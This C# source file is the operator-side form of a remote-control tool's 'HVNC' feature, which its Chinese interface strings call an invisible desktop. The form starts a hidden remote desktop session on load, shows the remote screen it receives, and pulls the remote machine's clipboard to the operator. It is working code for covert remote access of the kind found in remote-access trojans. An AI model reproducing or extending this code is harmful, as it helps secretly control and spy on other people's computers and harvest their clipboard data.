using System;
using System.Drawing;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using log4net;

namespace RemoteControl.Server
{
    public partial class FrmHVNC : FrmBase
    {
        private static readonly ILog Logger = LogManager.GetLogger(typeof(FrmHVNC));
        private SocketSession oSession;
        private bool _isCaptureMouse = false;
        private bool _isCaptureKeyboard = false;
        private int _currentFps = 5;

        public FrmHVNC(SocketSession session)
        {
            InitializeComponent();
            this.oSession = session;
            this.Load += FrmHVNC_Load;
        }

        private void FrmHVNC_Load(object sender, EventArgs e)
        {
            // 窗口打开时自动启动HVNC
            AutoStartHVNC();
        }

        private void AutoStartHVNC()
        {
            if (oSession != null)
            {
                RequestHVNCStart req = new RequestHVNCStart();
                req.Fps = _currentFps;
                oSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
                toolStripButtonStart.Enabled = false;
                toolStripButtonStop.Enabled = true;
                toolStripLabelStatus.Text = "正在启动HVNC...";
            }
        }

        #region Response handlers

        public void HandleScreen(ResponseHVNCScreen resp)
        {
            if (resp == null || resp.ImageData == null)
                return;
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ResponseHVNCScreen>(HandleScreen), resp);
                return;
            }
            try
            {
                Image oldImage = this.pictureBox1.Image;
                this.pictureBox1.Image = resp.GetImage();
                if (oldImage != null)
                    oldImage.Dispose();
            }
            catch (Exception ex)
            {
                Logger.Error("HVNC HandleScreen", ex);
            }
        }

        public void HandleStartResponse(ResponseHVNCStart resp)
        {
            if (resp == null) return;
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ResponseHVNCStart>(HandleStartResponse), resp);
                return;
            }
            if (resp.Result)
            {
                this.Text = "HVNC 隐形桌面 [" + resp.DesktopName + "] " +
                    resp.ScreenWidth + "x" + resp.ScreenHeight;
                toolStripButtonStart.Enabled = false;
                toolStripButtonStop.Enabled = true;
            }
            else
            {
                MessageBox.Show("HVNC启动失败: " + resp.Message, "错误",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void HandleClipboardResponse(ResponseClipboardGet resp)
        {
            if (resp == null) return;
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ResponseClipboardGet>(HandleClipboardResponse), resp);
                return;
            }
            if (resp.Result && !string.IsNullOrEmpty(resp.Text))
            {
                Clipboard.SetText(resp.Text);
                this.toolStripLabelStatus.Text = "剪贴板已复制到本地";
            }
            else
            {
                this.toolStripLabelStatus.Text = "远程剪贴板为空";
            }
        }

        #endregion
    }
}
